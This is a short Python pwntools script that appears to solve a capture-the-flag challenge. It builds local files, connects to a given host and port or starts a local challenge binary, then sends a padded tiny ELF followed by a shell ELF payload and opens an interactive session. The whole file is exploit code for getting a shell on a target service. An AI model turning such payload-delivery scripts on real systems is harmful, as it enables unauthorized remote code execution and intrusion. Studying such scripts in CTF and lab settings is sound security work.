from pwn import *
from subprocess import run

run("make", check=True)

if args.HOST and args.PORT:
    p = remote(args.HOST, args.PORT)
else:
    p = process("../chal/chal", cwd="../chal")

p.send(open("tiny.elf", "rb").read().ljust(71, b"\x00"))
p.sendline(open("shell.elf", "rb").read())
p.interactive()